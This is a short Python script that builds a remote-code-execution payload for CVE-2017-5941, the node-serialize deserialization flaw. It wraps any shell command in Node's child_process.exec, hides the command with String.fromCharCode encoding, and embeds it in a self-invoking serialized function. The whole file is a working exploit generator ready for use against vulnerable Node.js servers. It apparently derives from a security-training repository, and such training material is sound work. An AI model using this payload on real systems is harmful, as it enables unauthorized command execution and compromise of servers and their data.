#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Based on:  https://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py
Target URL example:  http://<RHOST>:<RPORT>
"""


def genPayload(cmd):
	"""CVE-2017-5941."""
	payload = _buildExecCommand(cmd)
	payload = _encodeString(payload)
	payload = '{"run":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % payload

	return payload


def _buildExecCommand(cmd):
	return '''\
        require('child_process').exec('%s', function(error, stdout, stderr) {
            console.log(error)
            console.log(stdout)
        })''' % cmd


def _encodeString(string):
	string_encoded = ''
	for char in string:
		string_encoded += ',' + str(ord(char))

	return string_encoded[1:]
